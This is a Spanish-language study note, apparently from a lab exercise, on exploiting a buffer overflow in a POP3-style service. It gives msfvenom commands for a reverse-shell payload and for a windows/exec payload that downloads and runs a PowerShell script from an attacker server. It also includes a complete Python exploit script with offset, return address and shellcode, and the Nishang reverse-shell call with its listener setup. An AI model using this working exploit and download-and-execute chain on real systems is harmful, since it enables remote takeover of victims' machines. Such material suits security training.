------
- Tags: #shellcode #powershell
----
# Explicación

Además de los payloads que se han utilizado en las secciones anteriores, también es posible utilizar payloads como “**windows/exec**” para cargar directamente el comando que se desea ejecutar en la variable **CMD** del payload. Esto permite crear un nuevo shellcode que, una vez interpretado, ejecutará directamente la instrucción deseada.

> El payload “**``windows/exec``**” es un payload de Metasploit que permite ejecutar un comando arbitrario en la máquina objetivo. Este payload requiere que se especifique el comando a ejecutar a través de la variable CMD en el payload. Al generar el shellcode con msfvenom, se puede utilizar el parámetro `-p windows/exec CMD=<comando>` para especificar el comando que se desea ejecutar.

Una vez generado el shellcode con el comando deseado, se puede utilizar la técnica de buffer overflow para sobrescribir el registro EIP y hacer que el flujo del programa entre en el shellcode. Al interpretar el shellcode, se ejecutará directamente el comando especificado en la variable CMD.

==DATO IMPORTANTE== si estamos en un escenario en el que **detectamos que la aplicación posee muchos Badchars** (más de diez), se recomienda no indicar el **Encoder** ``shikata_ga_nae`` ya que a veces **no podrá generarte el Shellcode correctamente**, es preferible **no indicar** ningún Encoder y que el ``msfvenom`` decida cual es el más óptimo.
# Ejemplo

Nosotros lo que podríamos hacer es que con la herramienta ``msfvenom`` en vez de colocar las instrucciones que usamos anteriormente

- ``msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.0.194 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread``

Podemos usar otro **Payload** diferente al de ``shell_reverse_tcp``, por lo tanto borramos ese Payload, el ``LHOST`` y el ``LPORT``. Colocamos un nuevo Payload ``windows/exec CMD="comando"`` que nos permitirá controlar el comando que deseemos ejecutar, en mi caso ejecutaremos un comando especifico que ahora explicaremos, quedando todo tal que así.

- ``msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.194/PS.ps1')" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread``

El campo ``CMD=`` hace alusión al comando que queremos que ejecute el sistema una vez se interprete nuestro Payload en la **Pila**, en mi caso el comando que quiero que se ejecute es este.

- ``CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.194/PS.ps1')"``

Este comando lo que hace es desde la **Powershell** de la máquina Windows (que cabe aclarar que es una Shell **muchísimo más poderosa** que la consola de tipo **ms2**) interpretar un recurso llamado ``PS.ps1`` que es un script programado en Powershell que voy a estar Hosteando como servicio HTTP en mi web.
Básicamente lo que estamos diciéndole a la máquina víctima es que **ejecute con Powershell un recurso que estamos compartiendo por un servidor local nuestro**.

Por lo tanto **copiaremos todo el Shellcode que nos brinda el ``msfvenom``** y lo **reemplazaremos en nuestro script** del Buffer Overflow en la variable ``shellcode``, recordemos **colocar el Shellcode en formato Bytes**(``b``).

```python
#!/usr/bin/python3

from struct import pack
import socket
import sys

# Variables globales. 
ip_address = "192.168.0.120"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4bcc6b)

shellcode = (b"\xb8\x34\x96\x23\x54\xda\xd4\xd9\x74\x24\xf4\x5d\x31\xc9"
b"\xb1\x44\x31\x45\x14\x83\xc5\x04\x03\x45\x10\xd6\x63\xdf"
b"\xbc\x94\x8c\x20\x3d\xf8\x05\xc5\x0c\x38\x71\x8d\x3f\x88"
b"\xf1\xc3\xb3\x63\x57\xf0\x40\x01\x70\xf7\xe1\xaf\xa6\x36"
b"\xf1\x83\x9b\x59\x71\xd9\xcf\xb9\x48\x12\x02\xbb\x8d\x4e"
b"\xef\xe9\x46\x05\x42\x1e\xe2\x53\x5f\x95\xb8\x72\xe7\x4a"
b"\x08\x75\xc6\xdc\x02\x2c\xc8\xdf\xc7\x45\x41\xf8\x04\x63"
b"\x1b\x73\xfe\x18\x9a\x55\xce\xe1\x31\x98\xfe\x10\x4b\xdc"
b"\x39\xca\x3e\x14\x3a\x77\x39\xe3\x40\xa3\xcc\xf0\xe3\x20"
b"\x76\xdd\x12\xe5\xe1\x96\x19\x42\x65\xf0\x3d\x55\xaa\x8a"
b"\x3a\xde\x4d\x5d\xcb\xa4\x69\x79\x97\x7f\x13\xd8\x7d\x2e"
b"\x2c\x3a\xde\x8f\x88\x30\xf3\xc4\xa0\x1a\x9e\x1b\x36\x21"
b"\xec\x1b\x48\x2a\x41\x73\x79\xa1\x0e\x04\x86\x60\x6b\xea"
b"\x64\xa1\x86\x82\x30\x20\x2b\xcf\xc2\x9e\x68\xe9\x40\x2b"
b"\x11\x0e\x58\x5e\x14\x4b\xde\xb2\x64\xc4\x8b\xb4\xdb\xe5"
b"\x99\xc5\xb4\x6e\x47\x54\x38\xf8\xe2\xf4\xd2\xd8\xa5\x41"
b"\x73\x30\x78\x2f\xf4\x6d\xcb\xcd\x90\x08\xb0\x65\x45\x9c"
b"\x53\xf2\xab\x77\xf9\x98\xf0\x1b\x68\x38\x99\x97\x43\xec"
b"\x01\x38\xe3\x9e\xa5\xa9\x6a\x3b\x65\x41\x1f\xaa\xe7\xce"
b"\xf7\x0b\x90\x64\x7c\x24\x5a\xab\x53\xf5\xa3\x81\x85\xc4"
b"\xe5\xdd\xf7\x16\x24\x2c\x31\x63\x17\x1e\x12\xa5\x17\xed"
b"\xa5\x9e\xd7")

payload = before_eip + eip + b"\x83\xEC\x10" + shellcode 


def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, port))
    banner = s.recv(1024)

    s.send(b"USER test" + b'\r\n')
    response = s.recv(1024) 
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

El recurso de Github del script que queremos que interprete nuestro Shellcode de ``msfvenom`` es [este](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), su propietario es **Nishang**. Es este script el que nosotros lo meteremos en nuestra máquina de atacante con ``wget`` y **lo vamos a renombrar** como ``PS.ps1``.
Este script es un script que **define una función** llamada ``Invoke-PowerShellTcp`` que una vez cargada e interpretada **podemos invocarla** por ejemplo como se define en el comentario ``.EXAMPLE`` del script, colocando la siguiente cadena al final del todo con **nuestra IP de atacante** y el **puerto** que queramos, en mi caso el *443*.

- ``Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.194 -Port 443``

De esta manera entablaríamos una **Reverse Shell** ya que con todo el script lo que hacemos es ejecutar una **PowerShell** y luego cargaría la instrucción de la conexión hacía nuestra máquina.

------

Ahora lo que tendríamos que hacer es:

- **Montar un servidor HTTP** en mi caso con ``python3 -m http.server 80`` para ofrecer el script ``PS.ps1``. 
- **Pondremos en escucha** por el *puerto 443* ya que ahí nos llegará la **Reverse Shell** una vez sea interpretado el Shellcode que metimos en la **Pila** (recordemos que es el shellcode que realiza la interpretación del script ``PS.ps1`` a través del servidor web nuestro, ejecutándolo con la PowerShell de la máquina Windows).
- **Ejecutamos** nuestro script del Buffer Overflow (En mi caso lo renombre de ``eip-control.py`` a ``BOF.py``) y esperamos el acceso a la máquina víctima.

![[BOF 35.png]]

Ganamos acceso a la máquina Windows pero esta vez a través de una **PowerShell** (**PS**).

==DATO IMPORTANTE== si estamos en un escenario en el que **detectamos que la aplicación posee muchos Badchars** (más de diez), se recomienda no indicar el **Encoder** ``shikata_ga_nae`` ya que a veces **no podrá generarte el Shellcode correctamente**, es preferible **no indicar** ningún Encoder y que el ``msfvenom`` decida cual es el más óptimo.